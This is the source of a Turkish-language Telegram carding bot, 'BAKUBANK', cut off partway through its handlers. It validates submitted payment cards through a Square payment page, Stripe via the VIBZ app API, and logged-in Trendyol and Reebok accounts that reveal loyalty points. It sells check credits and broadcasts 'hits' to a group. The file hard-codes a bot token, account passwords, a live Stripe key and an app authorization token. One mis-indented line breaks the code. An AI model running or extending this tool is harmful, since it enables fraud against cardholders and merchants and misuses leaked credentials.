'#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🏦 BAKUBANK — Telegram Kart Sorgu Botu
Multi Gateway: Square + VIBZ + Trendyol Puan + Reebok World Puan
"""

import re, json, time, uuid, random, hashlib, sqlite3, asyncio, logging
from datetime import datetime, timedelta
import requests, urllib3
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, LabeledPrice
from telegram import ParseMode
from telegram.ext import (Application, CommandHandler, MessageHandler, CallbackQueryHandler, PreCheckoutQueryHandler, filters, ContextTypes)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ═══════════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════════
BOT_TOKEN = "8935876563:AAGOLmHY_RQOURDpNIT6DIPmGg0qY280nos"
ADMIN_IDS = [7799217913]
MANDATORY_CHANNEL = "https://t.me/bakuhits"
HIT_GROUP_ID = -1004480050723
WEEKLY_CREDITS = 1999
REFERRAL_CREDITS = 100
REQUIRED_REFERRALS = 2
DB_PATH = "bot.db"

TRENDYOL_EMAIL = "mehmetq9989@gmail.com"
TRENDYOL_PASSWORD = "mmet998945419hF"
REEBOK_EMAIL = "mehmetq9989@gmail.com"
REEBOK_PASSWORD = "mmet998945419hF"

# Premium Emojiler (Senin verdiğin ID'ler)
EMOJI_OK      = '<tg-emoji emoji-id="5206607081334906820">✅</tg-emoji>'
EMOJI_STAR    = '<tg-emoji emoji-id="5427168083074628963">💎</tg-emoji>'
EMOJI_CARD    = '<tg-emoji emoji-id="612754891134449412">💳</tg-emoji>'
EMOJI_HIT     = '<tg-emoji emoji-id="5217822164362739968">👑</tg-emoji>'
EMOJI_WAIT    = '<tg-emoji emoji-id="5456140674028019486">⚡️</tg-emoji>'
EMOJI_SETTING = '<tg-emoji emoji-id="5341715473882955310">⚙️</tg-emoji>'
EMOJI_STATS   = '<tg-emoji emoji-id="5231200819986047254">📊</tg-emoji>'
EMOJI_DOLLAR  = '<tg-emoji emoji-id="5409048419211682843">💵</tg-emoji>'

STAR_PACKAGES = {
    "p1": {"title": "1.000 Kredi", "credits": 1000, "price": 8},
    "p2": {"title": "5.000 Kredi", "credits": 5000, "price": 30},
    "p3": {"title": "15.000 Kredi", "credits": 15000, "price": 75},
    "p4": {"title": "50.000 Kredi", "credits": 50000, "price": 200},
    "pw": {"title": "1 Hafta Premium", "premium": 7, "price": 50},
    "pm": {"title": "1 Ay Premium", "premium": 30, "price": 150},
}
GATEWAYS = {"square": "🟦 Square", "vibz": "🟪 VIBZ", "trendyol": "🟧 Trendyol Puan", "reebok": "🟥 Reebok World"}
DEFAULT_GATEWAYS = ["square", "vibz"]
logging.basicConfig(format="%(asctime)s | %(levelname)s | %(message)s", level=logging.INFO)
log = logging.getLogger(__name__)

# ═══════════════════════════════════════════════════════════
# VERİTABANI
# ═══════════════════════════════════════════════════════════
def init_db():
    con = sqlite3.connect(DB_PATH); c = con.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT, credits INTEGER DEFAULT 0, referred_by INTEGER, ref_count INTEGER DEFAULT 0, joined_at TEXT, last_weekly TEXT, premium_until TEXT, is_banned INTEGER DEFAULT 0)""")
    c.execute("""CREATE TABLE IF NOT EXISTS refs (id INTEGER PRIMARY KEY AUTOINCREMENT, referrer_id INTEGER, referred_id INTEGER UNIQUE, created_at TEXT)""")
    c.execute("""CREATE TABLE IF NOT EXISTS history (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, card TEXT, module TEXT, result TEXT, created_at TEXT)""")
    c.execute("""CREATE TABLE IF NOT EXISTS user_gateways (user_id INTEGER PRIMARY KEY, gateways TEXT)""")
    c.execute("""CREATE TABLE IF NOT EXISTS hit_counter (id INTEGER PRIMARY KEY, n INTEGER DEFAULT 0)""")
    con.commit(); con.close()

def db_get_user(uid):
    con = sqlite3.connect(DB_PATH); con.row_factory = sqlite3.Row
    r = con.execute("SELECT * FROM users WHERE user_id=?", (uid,)).fetchone()
    con.close(); return dict(r) if r else None

def db_create_user(uid, uname, fname, ref=None):
    con = sqlite3.connect(DB_PATH)
    con.execute("INSERT OR IGNORE INTO users (user_id, username, first_name, credits, referred_by, ref_count, joined_at, last_weekly) VALUES (?, ?, ?, ?, ?, 0, ?, ?)", (uid, uname, fname, WEEKLY_CREDITS, ref, datetime.utcnow().isoformat(), datetime.utcnow().isoformat()))
    con.commit(); con.close()

def db_update_credits(uid, delta):
    con = sqlite3.connect(DB_PATH)
    con.execute("UPDATE users SET credits = credits + ? WHERE user_id=?", (delta, uid))
    con.commit(); con.close()

def db_add_ref(ref_id, new_id):
    con = sqlite3.connect(DB_PATH); ok = True
    try:
        con.execute("INSERT INTO refs (referrer_id, referred_id, created_at) VALUES (?, ?, ?)", (ref_id, new_id, datetime.utcnow().isoformat()))
        con.execute("UPDATE users SET ref_count = ref_count + 1 WHERE user_id=?", (ref_id,))
        con.commit()
    except sqlite3.IntegrityError: ok = False
    con.close(); return ok

def db_grant_premium(uid, days):
    until = (datetime.utcnow() + timedelta(days=days)).isoformat()
    con = sqlite3.connect(DB_PATH)
    con.execute("UPDATE users SET premium_until=? WHERE user_id=?", (until, uid))
    con.commit(); con.close(); return until

def db_is_premium(uid):
    u = db_get_user(uid)
    if not u or not u["premium_until"]: return False
    try: return datetime.fromisoformat(u["premium_until"]) > datetime.utcnow()
    except Exception: return False

def db_add_history(uid, card, module, result):
    con = sqlite3.connect(DB_PATH)
    con.execute("INSERT INTO history (user_id, card, module, result, created_at) VALUES (?, ?, ?, ?, ?)", (uid, card, module, result, datetime.utcnow().isoformat()))
    con.commit(); con.close()

def db_all_users():
    con = sqlite3.connect(DB_PATH); con.row_factory = sqlite3.Row
    rows = con.execute("SELECT * FROM users").fetchall()
    con.close(); return [dict(r) for r in rows]

def db_reset_weekly(uid):
    con = sqlite3.connect(DB_PATH)
    con.execute("UPDATE users SET last_weekly=? WHERE user_id=?", (datetime.utcnow().isoformat(), uid))
    con.commit(); con.close()

def db_get_gateways(uid):
    con = sqlite3.connect(DB_PATH)
    r = con.execute("SELECT gateways FROM user_gateways WHERE user_id=?", (uid,)).fetchone()
    con.close()
    if r and r[0]: return [g for g in r[0].split(",") if g in GATEWAYS]
    return list(DEFAULT_GATEWAYS)

def db_set_gateways(uid, gws):
    con = sqlite3.connect(DB_PATH)
    con.execute("INSERT INTO user_gateways (user_id, gateways) VALUES (?, ?) ON CONFLICT(user_id) DO UPDATE SET gateways=excluded.gateways", (uid, ",".join(gws)))
    con.commit(); con.close()

def db_next_hit_id():
    con = sqlite3.connect(DB_PATH)
    con.execute("INSERT OR IGNORE INTO hit_counter (id, n) VALUES (1, 0)")
    con.execute("UPDATE hit_counter SET n = n + 1 WHERE id=1")
    con.commit()
    n = con.execute("SELECT n FROM hit_counter WHERE id=1").fetchone()[0]
    con.close(); return n

# ═══════════════════════════════════════════════════════════
# SQUARE CHECKER
# ═══════════════════════════════════════════════════════════
UA = ("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36")
SQ_BASE  = "https://www.jabberdogs.com/cgi-bin/square_payment.py"
SQ_HYDR  = "https://pci-connect.squareup.com/payments/hydrate"
SQ_NONCE = "https://pci-connect.squareup.com/v2/card-nonce"

SQ_FPS = [
    {"components": json.dumps({"user_agent": UA, "language": "tr-TR", "resolution": [800, 360], "available_resolution": [800, 360], "timezone_offset": -180, "navigator_platform": "Linux armv81", "regular_plugins": [], "adblock": False, "touch_support": [5, True, True], "js_fonts": ["Arial","Courier","Courier New","Georgia","Helvetica","Monaco","Palatino","Tahoma","Times","Times New Roman","Verdana","Wingdings 2","Wingdings 3"]}), "fingerprint": "3e13c55fcc4abbd9a81566c34bc0a1c1", "version": "fingerprint-v1"},
    {"components": json.dumps({"language": "tr-TR", "resolution": [800, 360], "available_resolution": [800, 360], "timezone_offset": -180, "navigator_platform": "Linux armv81", "regular_plugins": [], "adblock": False, "touch_support": [5, True, True], "js_fonts": ["Arial","Courier","Courier New","Georgia","Helvetica","Monaco","Palatino","Tahoma","Times","Times New Roman","Verdana","Wingdings 2","Wingdings 3"]}), "fingerprint": "73e8b6a9bc484dc0a4444a4f407ffa82", "version": "fingerprint-v1-sans-ua"},
]

def _pow(base, prefix, app_id, loc_id, iid):
    c = 0
    while True:
        c += 1
        h = hashlib.sha256(f"{base}:{c}:{app_id},{loc_id},{iid}".encode()).hexdigest()
        if h.startswith(prefix): return c

class SquareChecker:
    def __init__(self):
        self.s = requests.Session()
        self.s.headers.update({"User-Agent": UA, "Accept-Language": "tr-TR,tr;q=0.9,en;q=0.8"})
        self.s.trust_env = False
        self.app_id = self.loc_id = self.ver = None
        self.JH = self.GH = None

    def setup(self):
        html = self.s.get(SQ_BASE, timeout=40, verify=False).text
        self.app_id = re.search(r"""appId\s*=\s*['"]([^'"]+)['"]""", html).group(1)
        self.loc_id = re.search(r"""locationId\s*=\s*['"]([^'"]+)['"]""", html).group(1)
        m = (re.search(r"web\.squarecdn\.com/(\d+\.\d+\.\d+)/", html)
             or re.search(r"version['\"]?\s*[:=]\s*['\"](\d+\.\d+\.\d+)['\"]", html))
        self.ver = m.group(1) if m else "1.85.0"
        self.JH = {"User-Agent": UA, "Accept": "application/json", "content-type": "application/json; charset=utf-8", "origin": "https://web.squarecdn.com", "referer": "https://web.squarecdn.com/", "accept-language": "tr-TR,tr;q=0.9,en;q=0.8"}
        self.GH = {"User-Agent": UA, "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "referer": SQ_BASE, "accept-language": "tr-TR,tr;q=0.9,en;q=0.8"}

    def check(self, num, ay, yil, cvv):
        try:
            if not self.app_id: self.setup()
            full_year = int("20" + yil) if len(yil) == 2 else int(yil)
            hj = self.s.get(SQ_HYDR, params={"applicationId": self.app_id, "hostname": "www.jabberdogs.com", "locationId": self.loc_id, "version": self.ver}, headers=self.JH, timeout=40, verify=False).json()
            iid, sid, prefix = hj["instanceId"], hj["sessionId"], hj.get("powPrefix", "000")
            body = {"analytics": {"fingerprints": [dict(f) for f in SQ_FPS], "timezone": "-180", "website_url": "https://www.jabberdogs.com/"}, "client_id": self.app_id, "instance_id": iid, "location_id": self.loc_id, "payment_method_tracking_id": str(uuid.uuid4()), "session_id": sid, "card_data": {"cvv": cvv, "exp_month": int(ay), "exp_year": full_year, "number": num}}
            token = None
            for _ in range(20):
                body["pow_counter"] = _pow(body["session_id"], prefix, self.app_id, self.loc_id, iid)
                ts = str(int(time.time() * 1000))
                r = self.s.post(SQ_NONCE, params={"_": ts + ".0", "version": self.ver}, data=json.dumps(body), headers=self.JH, timeout=40, verify=False)
                d = r.json()
                if "pow_prefix" in d and "pow_base" in d:
                    prefix = d["pow_prefix"]; body["session_id"] = d["pow_base"]; continue
                token = d.get("card_nonce")
                if not token: return "DECLINED"
                break
            client = "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=8))
            email = "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=10)) + "@gmail.com"
            fin = self.s.get(SQ_BASE, params={"amount": "1.00", "client": client, "email": email, "token": token}, headers=self.GH, timeout=40, verify=False)
            if re.search(r"'code':\s*'([^']+)'", fin.text): return "DECLINED"
            if "Exception" in fin.text or "problem processing" in fin.text: return "DECLINED"
            return "APPROVED"
        except Exception: return "DECLINED"

# ═══════════════════════════════════════════════════════════
# VIBZ CHECKER
# ═══════════════════════════════════════════════════════════
VIBZ_CREATE = "https://vibz.stwpower.com/power_bank/api/bankcard/stripe/createSetupIntent"
VIBZ_POSSESSOR = "Possessor 1I1/xy0GbbDYwK5xkCXVxANB+NryBfyb17Wyqph2LyBehTPQ/2Za96UQi2CC3+NRDN2GCelfjjKXnxt77Bkp31OsHImCIVCedbXB+LCn8a2g4qQaLFFwSH3W9txaXhHJJcCZez1XzZ9Ceae+WoyjyLrjx/i3G20JUe+JalsAOcNqmv5bFrFXnWHK+0Cv5Me8xqTehJKekS1ykD6IbO6+s+k19WSiuTupXLT8ukPSUQc04IkDIOzoJVLFJRmrC+onZ7I6BWFWSaP27qddLdssE4plPAgdIiH6pCXbVDZCW2a+pQVA1IUiZAdYdLSLUA8/bG03JFuQ/WE/1axeUqujZK2Srul6rYgRNRBxjRYsytLuugBH7yOanNO9t9DIgGKmW7UR/c6tfRJA41LN7IBt7wnL4r4bSOuNSozR3Q7oNkKcpr58+BQIfnAbeTgtTK+WQq3MwtPr14dE4gkDiwKpormuIpHUW6342fyxhai3pDCADyAEEGI6esi7GSxv2kIUcwCKuDpQ4+TVDHgr3f5CrcGRW5IYPkpPlsC8lAWdMBwCxEuHrP/AXiccZvW6zkE/KjI7xsK90JwUeu6qR5lsgAo9Qu1dhdfqoEelWkSkrUQ9fba9CqiReE3IQkFNiRQbluMnoNgAR3/kn30JItt7HmR13/ne5aE7ZW6W1NPDGesMerF9EjCWZ0m/cmRoG2I2lvLsAfVd+mcNKs0LPq2zWJTNagUAVCTbwmJwKOF6PBs+R5NNwutcnl40E3venFFLH3CtNWNCZqgENbbfNlKPKqn5jtC4OXGdKqvx1FU5EAyzTJIrN7XAxlWjz91NXYODbHRJvnacWZP+agTH3AA2spz3HkK48hpiyQeUdLJ2zgnL3NhyMcpzWoCuIjmw9edYYmX8DzCna1v9mCFn1TuL2uSNLD+CiJhUgwC2VyTSRjPMbolhqtX5RSSipq+uzGbKQjRaB0MnxqKJuxm2KhKRmQn0IMIGR6Wc/LmEicnm6QaT5zJmTLwRsFO+Ny+EKyh4mTPTHZBqM+KtyC6EHW3FvV2dbKHK/r85XACljy97jvV/pVXiAUpUA6hqSANT7YO2JFx+81mb+KbDe+RyOCCwNPoV0Ze1dME1x9W1wEnDFdk="
VIBZ_PK = "pk_live_51ONMPJCYEondzKCZD7N8xv2rgbCsyLOv2tEYGupao0fdROvY0DrlEZh1gUKuofYPBfD8NK35GGAV6t4OBMjHuIA200FTFfkaiy"

class VibzChecker:
    def check(self, num, ay, yil, cvv):
        try:
            s = requests.Session(); s.trust_env = False
            h = {"User-Agent": "VIBZ/1 CFNetwork/3826.600.41 Darwin/24.6.0", "Content-Type": "application/json; charset=utf-8", "Accept-Language": "tr-TR,tr;q=0.9", "Authorization": VIBZ_POSSESSOR}
            r = s.post(VIBZ_CREATE, params={"language": "ger"}, json={}, headers=h, timeout=40, verify=False)
            m = re.search(r"(seti_[a-zA-Z0-9]+_secret_[a-zA-Z0-9]+)", r.text)
            if not m: return "DECLINED"
            client_secret = m.group(1)
            intent_id = client_secret.split("_secret_")[0]
            payload = {"client_secret": client_secret, "expand[0]": "payment_method", "payment_method_data[allow_redisplay]": "unspecified", "payment_method_data[billing_details][address][country]": "TR", "payment_method_data[card][cvc]": cvv, "payment_method_data[card][exp_month]": ay, "payment_method_data[card][exp_year]": yil, "payment_method_data[card][number]": num, "payment_method_data[payment_user_agent]": "stripe-ios/23.27.6; variant.legacy; PaymentSheet", "payment_method_data[type]": "card", "use_stripe_sdk": "true"}
            h2 = {"User-Agent": "VIBZ/1 CFNetwork/3826.600.41 Darwin/24.6.0", "x-stripe-user-agent": '{"version":"0.37.3","url":"https://github.com/stripe/stripe-react-native","type":"iPad15,3","lang":"objective-c","name":"@stripe/stripe-react-native","bindings_version":"23.27.6","model":"iPad","vendor_identifier":"B0C09781-0D45-4FCD-BCD0-AE0A46B41CDC","os_version":"18.6","partner_id":""}', "stripe-version": "2020-08-27", "authorization": f"Bearer {VIBZ_PK}", "accept-language": "tr-TR,tr;q=0.9"}
            rc = s.post(f"https://api.stripe.com/v1/setup_intents/{intent_id}/confirm", data=payload, headers=h2, timeout=40, verify=False)
            d = rc.json()
            if "error" in d: return "DECLINED"
            status = d.get("status")
            if status == "succeeded": return "AUTHED"
            elif status in ("requires_action", "requires_source_action"): return "3DS"
            return "DECLINED"
        except Exception: return "DECLINED"

# ═══════════════════════════════════════════════════════════
# TRENDYOL & REEBOK CHECKER
# ═══════════════════════════════════════════════════════════
class TrendyolChecker:
    BASE = "https://www.trendyol.com"
    AUTH_URL = "https://apigw.trendyol.com/discovery-sfint-authentication-service/api/auth/login?channelId=1"
    PAYMENT = "https://payment.trendyol.com"
    REWARD_URL = "https://payment.trendyol.com/v1/card-reward/bank-reward-inquiry"
    def __init__(self):
        self.session = None; self._ready = False
    def login(self, email, password):
        try:
            s = requests.Session(); s.trust_env = False
            s.headers.update({"User-Agent": UA, "Sec-Ch-Ua": '"Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"', "Sec-Ch-Ua-Mobile": "?1", "Sec-Ch-Ua-Platform": '"Android"', "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7"})
            for name, value in {"countryCode": "TR", "storefrontId": "1", "language": "tr", "platform": "mweb", "AZ_SELECTED": "false", "anonUserId": "17211a62-02ff-444c-8891-92d537c0f399", "pid": "b5ea8ab2-b8b8-4d21-a6e4-7c16883293e4", "sid": "nqz0jgoDZR"}.items():
                s.cookies.set(name, value, domain=".trendyol.com")
            headers = {**s.headers, "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": self.BASE, "Referer": f"{self.BASE}/giris"}
            r = s.post(self.AUTH_URL, json={"email": email, "password": password, "turnstileToken": ""}, headers=headers, timeout=20, verify=False)
            if r.status_code != 200: return False
            self.session = s; self._ready = True; return True
        except Exception: return False
    def check(self, num, ay, yil, cvv=""):
        if not self._ready or self.session is None: return "DECLINED"
        try:
            headers = {**self.session.headers, "Accept": "*/*", "Content-Type": "application/json", "X-Channelid": "1", "App-Name": "Trendyol", "X-Storefrontid": "1", "X-Features": "OPTIONAL_REBATE;PICKUP_FEE_ENABLED;VAS_QUANTITY_ENABLED;AUTOMATIC_CARD_UPDATE;", "X-Ab-Test-Values": "1", "X-Applicationid": "7", "Origin": self.PAYMENT, "Referer": f"{self.PAYMENT}/v3/card-fragment?application-id=7&storefront-id=1&culture=tr-TR"}
            r = self.session.post(self.REWARD_URL, json={"card": {"type": "raw", "number": num, "expireMonth": ay, "expireYear": yil, "cvv": ""}}, headers=headers, timeout=25, verify=False)
            if r.status_code != 200: return "DECLINED"
            d = r.json()
            rewards = (d.get("rewards") or d.get("rewardList") or d.get("bankRewards") or d.get("campaigns") or d.get("bankRewardInquiryResponse", {}).get("rewards") or [])
            if rewards:
                total = 0.0
                for rw in rewards:
                    amt = (rw.get("amount") or rw.get("rewardAmount") or rw.get("value") or rw.get("maxAmount") or 0)
                    try: total += float(amt)
                    except Exception: pass
                if total > 0: return "PUAN:" + str(round(total, 2))
            crm = d.get("cardRewardMoney") or d.get("data", {}).get("cardRewardMoney")
            if crm:
                try:
                    v = float(crm)
                    if v > 0: return "PUAN:" + str(round(v, 2))
                except Exception: pass
            return "DECLINED"
        except Exception: return "DECLINED"

class ReebokChecker:
    BASE = "https://www.reebok.com.tr"
    TOKEN_URL = "https://www.reebok.com.tr/webservice/v1/token/createtoken"
    LOGIN_URL = "https://www.reebok.com.tr/ajax/customer/login"
    POINTS_URL = "https://checkout.reebok.com.tr/webservice/v1/retrievecardloyalty"
    def __init__(self):
        self.session = None; self._ready = False
    def login(self, email, password):
        try:
            s = requests.Session(); s.trust_env = False
            s.headers.update({"User-Agent": UA, "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7", "x-requested-with": "XMLHttpRequest", "origin": self.BASE, "referer": f"{self.BASE}/customer/login"})
            r = s.post(self.TOKEN_URL, params={"form_name": "customer-login-form"}, timeout=20, verify=False)
            csrf = r.text.strip()
            if not csrf: return False
            r = s.post(self.LOGIN_URL, data={"csrf_token": csrf, "username": email, "password": password}, headers={**s.headers, "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Accept": "application/json, text/javascript, */*; q=0.01"}, timeout=25, verify=False)
            j = r.json()
            if not j.get("success"): return False
        tok = s.cookies.get("_token")
            if not tok: return False
            self.session = s; self._ready = True; return True
        except Exception: return False
    def check(self, num, ay, yil, cvv="000"):
        if not self._ready or self.session is None: return "DECLINED"
        try:
            tok = self.session.cookies.get("_token")
            if not tok: return "DECLINED"
            headers = {"Host": "checkout-be.reebok.com.tr", "User-Agent": UA, "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "authenticationtoken": tok, "platform": "MOBILEWEB", "origin": "https://checkout.reebok.com.tr", "referer": "https://checkout.reebok.com.tr/", "accept-language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7"}
            r = self.session.post(self.POINTS_URL, json={"cc_number": num, "cc_cvv": cvv or "000", "cc_month": ay, "cc_year": yil}, headers=headers, timeout=25, verify=False)
            d = r.json()
            if d.get("data"):
                money = d["data"].get("cardRewardMoney")
                if money:
                    try:
                        v = float(money)
                        if v > 0: return "PUAN:" + str(round(v, 2))
                    except Exception: pass
            return "DECLINED"
        except Exception: return "DECLINED"

SQUARE = SquareChecker()
VIBZ = VibzChecker()
TRENDYOL = TrendyolChecker()
REEBOK = ReebokChecker()

def init_gateway_sessions():
    try:
        log.info("Trendyol login OK" if TRENDYOL.login(TRENDYOL_EMAIL, TRENDYOL_PASSWORD) else "Trendyol login FAIL")
    except Exception as e: log.error(f"Trendyol: {e}")
    try:
        log.info("Reebok login OK" if REEBOK.login(REEBOK_EMAIL, REEBOK_PASSWORD) else "Reebok login FAIL")
    except Exception as e: log.error(f"Reebok: {e}")

# ═══════════════════════════════════════════════════════════
# YARDIMCILAR
# ═══════════════════════════════════════════════════════════
def fmt_credit(n): return f"{int(n):,}".replace(",", ".")
def user_mention(u): return f'<a href="tg://user?id={u.get("user_id")}">{u.get("first_name") or "Kullanıcı"}</a>'

def luhn(num):
    d = [int(c) for c in num if c.isdigit()]
    if len(d) < 12: return False
    t, p = 0, len(d) % 2
    for i, x in enumerate(d):
        if i % 2 == p:
            x *= 2
            if x > 9: x -= 9
        t += x
    return t % 10 == 0

def parse_card(line):
    parts = re.split(r"[|:/ ]+", line.strip())
    if len(parts) < 4: return None
    num = re.sub(r"\D", "", parts[0])
    if len(num) < 12: return None
    return num, parts[1].zfill(2), parts[2][-2:], parts[3]

def resolve_channel(link):
    m = re.search(r"t\.me/([A-Za-z0-9_]+)", link.strip().rstrip("/"))
    return "@" + m.group(1) if m else None

CHANNEL_USERNAME = resolve_channel(MANDATORY_CHANNEL)

async def is_member(bot, uid, chat_id):
    try:
        m = await bot.get_chat_member(chat_id, uid)
        return m.status in ("member", "administrator", "creator")
    except Exception: return False

async def check_mandatory(bot, uid):
    if not await is_member(bot, uid, CHANNEL_USERNAME): return CHANNEL_USERNAME
    return None

# ═══════════════════════════════════════════════════════════
# BUTONLAR
# ═══════════════════════════════════════════════════════════
def mandatory_keyboard():
    return InlineKeyboardMarkup([[InlineKeyboardButton("📢 Kanala Katıl", url=MANDATORY_CHANNEL, style="primary")], [InlineKeyboardButton("✅ Katıldım", callback_data="check_join", style="success")]])

def menu_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🎯 Tekli Sorgu", callback_data="menu_check", style="success"), InlineKeyboardButton("👤 Profilim", callback_data="menu_acc", style="primary")],
        [InlineKeyboardButton("⚙️ Gateway Seç", callback_data="menu_gw", style="primary"), InlineKeyboardButton("👥 Referans", callback_data="menu_ref", style="primary")],
        [InlineKeyboardButton("🛠 Araçlar", callback_data="menu_tools", style="danger"), InlineKeyboardButton("⭐ Stars Mağaza", callback_data="menu_stars", style="success")],
    ])

def gateway_keyboard(uid):
    active = db_get_gateways(uid)
    rows = []
    for key, label in GATEWAYS.items():
        mark = "✅" if key in active else "⬜"
        rows.append([InlineKeyboardButton(f"{mark} {label}", callback_data=f"gw_toggle_{key}")])
    rows.append([InlineKeyboardButton("💾 Kaydet & Devam", callback_data="gw_save", style="success"), InlineKeyboardButton("❌ İptal", callback_data="gw_cancel", style="danger")])
    return InlineKeyboardMarkup(rows)

async def show_gateway_menu(message, uid):
    active = db_get_gateways(uid)
    txt = (f"{EMOJI_SETTING} <b>Gateway Seçimi</b>\n━━━━━━━━━━━━━━━━━━━━\nHangi gateway'lerde check yapılsın?\nButonlara basarak aç/kapat.\n\n🟢 Aktif: <b>{len(active)}</b> adet")
    await message.reply_text(txt, parse_mode=ParseMode.HTML, reply_markup=gateway_keyboard(uid))

async def on_gateway_toggle(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    key = q.data.replace("gw_toggle_", "")
    if key not in GATEWAYS: await q.answer("Bilinmeyen gateway"); return
    active = db_get_gateways(q.from_user.id)
    if key in active:
        if len(active) == 1: await q.answer("⚠️ En az 1 gateway açık kalmalı", show_alert=True); return
        active.remove(key)
    else: active.append(key)
    db_set_gateways(q.from_user.id, active)
    await q.answer("Açıldı" if key in active else "Kapatıldı")
    try: await q.message.edit_reply_markup(reply_markup=gateway_keyboard(q.from_user.id))
    except Exception: pass

async def on_gateway_save(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query; await q.answer("Kaydedildi")
    try: await q.message.edit_text(f"{EMOJI_OK} <b>Gateway'ler kaydedildi</b>", parse_mode=ParseMode.HTML)
    except Exception: pass

async def on_gateway_cancel(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query; await q.answer("İptal")
    try: await q.message.delete()
    except Exception: pass

# ═══════════════════════════════════════════════════════════
# CHECK MANTIĞI VE HIT
# ═══════════════════════════════════════════════════════════
async def check_one(num, ay, yil, cvv, gateways):
    t0 = time.time()
    async def _run(key):
        try:
            if key == "square":   return await asyncio.to_thread(SQUARE.check, num, ay, yil, cvv)
            if key == "vibz":     return await asyncio.to_thread(VIBZ.check, num, ay, yil, cvv)
            if key == "trendyol": return await asyncio.to_thread(TRENDYOL.check, num, ay, yil, cvv)
            if key == "reebok":   return await asyncio.to_thread(REEBOK.check, num, ay, yil, cvv)
        except Exception: return "DECLINED"
        return "DECLINED"

    tasks = {k: asyncio.create_task(_run(k)) for k in gateways}
    results = {}
    for k, t in tasks.items(): results[k] = await t
    elapsed = time.time() - t0

    is_live = False; hit_gw = gateways[0] if gateways else "square"
    best_points = 0.0; pts_gw = gateways[0] if gateways else "square"
    
    for k in gateways:
        v = results[k]
        if v in ("APPROVED", "AUTHED"):
            is_live = True; hit_gw = k
        elif v.startswith("PUAN:"):
            try:
                p = float(v.split(":", 1)[1])
                if p > best_points: best_points = p; pts_gw = k
            except Exception: pass

    if is_live: return "live", "APPROVED", hit_gw, elapsed
    if best_points > 0: return "points", "PUAN:" + str(round(best_points, 2)), pts_gw, elapsed
    return "declined", "DECLINED", hit_gw, elapsed

async def send_hit_to_group(ctx, user, kind="live", gateway="Square", elapsed=0.0):
    try:
        hit_id = db_next_hit_id()
        uname = f"@{user.username}" if getattr(user, "username", None) else (user.first_name or "Kullanıcı")
        gw_label = {"square": "Square", "vibz": "VIBZ", "trendyol": "Trendyol Puan", "reebok": "Reebok World"}.get(gateway, gateway)
        
        header = f"{EMOJI_HIT} <b>Hit Detected #{hit_id}</b> 🔥"
        body = f"💬 <b>Message:</b> {'Card Auth Success!' if kind == 'live' else 'Points Found!'}"
        
        txt = (f"⚡️ {header}\n"
               f"━━━━━━━━━━━━━━━━━━━━\n"
               f"😎 <b>By:</b> {uname}\n"
               f"{body}\n"
               f"⏱ <b>Time:</b> {elapsed:.2f}s\n"
               f"🔷 <b>Gateway:</b> {gw_label}\n"
               f"━━━━━━━━━━━━━━━━━━━━\n"
               f"✨ <b>BAKUBANK HITS</b>")
        await ctx.bot.send_message(HIT_GROUP_ID, txt, parse_mode=ParseMode.HTML)
    except Exception as e: log.error(f"hit bildirim: {e}")

# ═══════════════════════════════════════════════════════════
# HANDLERS
# ═══════════════════════════════════════════════════════════
async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    if not db_get_user(u.id): db_create_user(u.id, u.username, u.first_name, None)

    if await check_mandatory(ctx.bot, u.id):
        await update.message.reply_text("🚫 <b>Botu kullanmak için önce kanala katıl!</b>\n\nButona bas, kanala katıl, sonra kontrol et.", parse_mode=ParseMode.HTML, reply_markup=mandatory_keyboard())
        return
    await send_main_menu(update, ctx)

async def send_main_menu(update, ctx):
    u = update.effective_user
    user = db_get_user(u.id)
    prem = "💎 Premium" if db_is_premium(u.id) else "🆓 Ücretsiz"
    gws = ", ".join(GATEWAYS[g] for g in db_get_gateways(u.id))
    try:
        await update.effective_chat.send_message(
            f"🏦 <b>BAKUBANK</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 <b>Hesap:</b> {user_mention(user)}\n"
            f"💠 <b>Durum:</b> {prem}\n"
            f"{EMOJI_DOLLAR} <b>Kredi:</b> {fmt_credit(user['credits'])}\n"
            f"👥 <b>Referans:</b> {user['ref_count']}/{REQUIRED_REFERRALS}\n"
            f"{EMOJI_SETTING} <b>Gateway:</b> {gws}\n"
            f"━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📌 Menüden işlem seç:",
            parse_mode=ParseMode.HTML, reply_markup=menu_keyboard())
    except Exception as e: log.error(f"menu: {e}")

async def on_check_join(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query; await q.answer()
    if await check_mandatory(ctx.bot, q.from_user.id):
        await q.answer("❌ Hâlâ katılmadın!", show_alert=True); return
    try: await q.message.delete()
    except Exception: pass
    await send_main_menu(update, ctx)

async def on_menu(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query; await q.answer()
    u = q.from_user; user = db_get_user(u.id)

    if q.data == "menu_check":
